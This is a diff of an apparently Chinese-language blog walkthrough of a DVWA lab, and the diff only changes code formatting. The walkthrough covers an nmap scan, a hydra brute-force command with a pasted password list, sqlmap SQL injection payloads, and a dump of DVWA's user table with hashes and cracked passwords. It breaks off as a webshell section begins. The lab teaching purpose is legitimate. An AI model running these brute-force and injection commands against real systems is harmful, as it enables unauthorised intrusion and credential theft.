@@ -1261,7 +1261,7 @@ Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopene
 </code></pre></div><p>可以发现它很快就扫出来了</p>
 <p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-31-32.png" alt=""></p>
 <p>终端里获取到的信息如下，说明这个192.168.0.107就是靶机的地址</p>
-<pre><code>Nmap scan report for 192.168.0.107
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Nmap scan report for 192.168.0.107
 Host is up (0.00028s latency).
 Not shown: 977 closed ports
 PORT     STATE SERVICE
@@ -1297,7 +1297,7 @@ Uptime guess: 0.002 days (since Sun Oct 20 06:23:17 2019)
 Network Distance: 1 hop
 TCP Sequence Prediction: Difficulty=192 (Good luck!)
 IP ID Sequence Generation: All zeros
-</code></pre><p>那么我已经找到靶机了，接下来就可以正式进行攻击了。</p>
+</code></pre></div><p>那么我已经找到靶机了，接下来就可以正式进行攻击了。</p>
 <h3 id="第一关简单破解web表单">第一关|简单破解Web表单</h3>
 <p>接下来我们在浏览器输入刚刚扫描到的地址，就可以进入靶机上的网页了。</p>
 <p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_06-41-20.png" alt=""></p>
@@ -1349,8 +1349,8 @@ Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color
 username=admin&amp;password=6666666666&amp;Login=Login
 </code></pre></div><p>嘛…这么一大堆看着都头晕</p>
 <p>诶嘿，其实这里你只需要保存这一部分就可以了</p>
-<pre><code>username=admin&amp;password=6666666666&amp;Login=Login
-</code></pre><p>嘛，上面这点还不够呢，还需要获取一段信息。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">username=admin&amp;password=6666666666&amp;Login=Login
+</code></pre></div><p>嘛，上面这点还不够呢，还需要获取一段信息。</p>
 <p>现在网页看起来像时间停止了一样一动不动的对不对？</p>
 <p>那么我来解释一下burp这里三个按钮的意思</p>
 <ul>
@@ -1361,8 +1361,8 @@ username=admin&amp;password=6666666666&amp;Login=Login
 <p>这时，网页下面弹出了一段字符串</p>
 <p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-26-23.png" alt=""></p>
 <p>码下来，一会儿要用到的</p>
-<pre><code>Login failed
-</code></pre><p>接下来把burpsuite关掉，浏览器代理关掉，这个不多说步骤了。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Login failed
+</code></pre></div><p>接下来把burpsuite关掉，浏览器代理关掉，这个不多说步骤了。</p>
 <p>嗯…整个抓包的过程就完成了。然后就是进行<strong>爆破</strong>了</p>
 <h4 id="爆破">爆破</h4>
 <p>嘛…最精彩的部分来了</p>
@@ -1376,7 +1376,7 @@ username=admin&amp;password=6666666666&amp;Login=Login
 <li>IP地址 : 也就是目标的地址咯，上面的<code>192.168.0.4</code></li>
 <li>http-post-form : 指定爆破类型，后面还要加爆破的页面地址，这里是http的post页面 没有密码字典？我这里提供一个，你自己复制进一个txt文件里就可以了。</li>
 </ul>
-<pre><code>123456
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">123456
 12345
 123456789
 Password
@@ -1748,9 +1748,9 @@ idc0123
 189532210113
 idc123
 gedingfeng1102888
-</code></pre><p>以及你需要把上面抓到的<code>username=admin&amp;password=6666666666&amp;Login=Login</code>和<code>Login failed</code>整合一下变成这样:</p>
-<pre><code>username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed
-</code></pre><p>整合一下，需要执行的指令就是下面这个了</p>
+</code></pre></div><p>以及你需要把上面抓到的<code>username=admin&amp;password=6666666666&amp;Login=Login</code>和<code>Login failed</code>整合一下变成这样:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed
+</code></pre></div><p>整合一下，需要执行的指令就是下面这个了</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ hydra -l admin -P ./密码字典/pass-wake.txt -V -e ns 192.168.0.4 http-post-form <span style="color:#e6db74">&#34;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed&#34;</span>
 </code></pre></div><p>它很快就会给你破解出来</p>
 <p><img src="/img/%E6%88%AA%E5%9B%BE_2019-10-20_07-49-15.png" alt=""></p>
@@ -1784,34 +1784,34 @@ gedingfeng1102888
 <p>最后一个选项选<code>n</code>不必浪费时间了。</p>
 <p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-19-51.png" alt=""></p>
 <p>接下来我们就获得我们需要的信息了，数据库版本什么的。我把它贴出来吧。</p>
-<pre><code>sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
 ---
 Parameter: id (GET)
     Type: boolean-based blind
     Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
-    Payload: id=6666666' OR NOT 1144=1144#&amp;Submit=Submit
+    Payload: id=6666666&#39; OR NOT 1144=1144#&amp;Submit=Submit
 
     Type: error-based
     Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
-    Payload: id=6666666' OR ROW(6268,9799)&gt;(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(6268=6268,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM (SELECT 9569 UNION SELECT 7660 UNION SELECT 7717 UNION SELECT 8645)a GROUP BY x)-- dPXL&amp;Submit=Submit
+    Payload: id=6666666&#39; OR ROW(6268,9799)&gt;(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(6268=6268,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM (SELECT 9569 UNION SELECT 7660 UNION SELECT 7717 UNION SELECT 8645)a GROUP BY x)-- dPXL&amp;Submit=Submit
 
     Type: time-based blind
     Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: id=6666666' AND (SELECT 4811 FROM (SELECT(SLEEP(5)))hDuM)-- SMOw&amp;Submit=Submit
+    Payload: id=6666666&#39; AND (SELECT 4811 FROM (SELECT(SLEEP(5)))hDuM)-- SMOw&amp;Submit=Submit
 
     Type: UNION query
     Title: MySQL UNION query (NULL) - 2 columns
-    Payload: id=6666666' UNION ALL SELECT NULL,CONCAT(0x7162786b71,0x794f4b67535851624375466379624550476a6243584e4b754d7250524e524d7a6c70587370704877,0x716a767071)#&amp;Submit=Submit
+    Payload: id=6666666&#39; UNION ALL SELECT NULL,CONCAT(0x7162786b71,0x794f4b67535851624375466379624550476a6243584e4b754d7250524e524d7a6c70587370704877,0x716a767071)#&amp;Submit=Submit
 ---
 [13:19:30] [INFO] the back-end DBMS is MySQL
 back-end DBMS: MySQL &gt;= 4.1
-[13:19:30] [INFO] fetched data logged to text files under '/home/weepingdogel/.sqlmap/output/192.168.0.105'
-</code></pre><p>接下来我们就要查看数据库里面的内容了，由于原因，我就不贴出逐级查看的代码了，我直接dump</p>
+[13:19:30] [INFO] fetched data logged to text files under &#39;/home/weepingdogel/.sqlmap/output/192.168.0.105&#39;
+</code></pre></div><p>接下来我们就要查看数据库里面的内容了，由于原因，我就不贴出逐级查看的代码了，我直接dump</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sqlmap -r <span style="color:#e6db74">&#34;~/get.txt&#34;</span> --dump
 </code></pre></div><p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-26-48.png" alt=""></p>
 <p>出来了。</p>
 <p>如果你终端里获取到了以下信息，那么说明，第二关通过了</p>
-<pre><code>Database: dvwa
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Database: dvwa
 Table: users
 [5 entries]
 +---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
@@ -1823,7 +1823,7 @@ Table: users
 | 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
 | 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
 +---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
-</code></pre><h3 id="第三关操作系统渗透">第三关|操作系统渗透</h3>
+</code></pre></div><h3 id="第三关操作系统渗透">第三关|操作系统渗透</h3>
 <p>Well,</p>
 <p>接下来我们就要进行最关键的一环了，我们将使用Webshell的方式入侵靶机的操作系统。</p>
 <p>知道PHP吗？我对它了解也不是很多，总之它可以被上传到服务器然后以可执行文件的方式运行。</p>
